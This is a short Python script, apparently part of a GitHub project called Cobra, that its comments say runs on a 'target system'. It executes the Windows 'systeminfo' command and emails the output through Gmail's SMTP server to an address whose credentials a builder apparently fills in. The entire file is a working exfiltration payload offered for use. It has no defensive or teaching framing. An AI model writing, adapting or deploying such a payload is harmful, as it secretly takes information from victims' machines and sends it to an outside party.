#By SxNade
#https://github.com/SxNade/Cobra
#CONTRIBUTE

import subprocess
import smtplib
import getpass

#importing the requred Libraries

email = "this will be edited automatically"

password = "this will be edited automatically"


#Function to send email
def sml(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

#command that will be run on target system to gather info
command = "systeminfo"

#Storing the target data in a data variable

data = subprocess.check_output(command, shell=True)

sml(email, password, data)
#calling the sml function to send mail with data as message parameter..
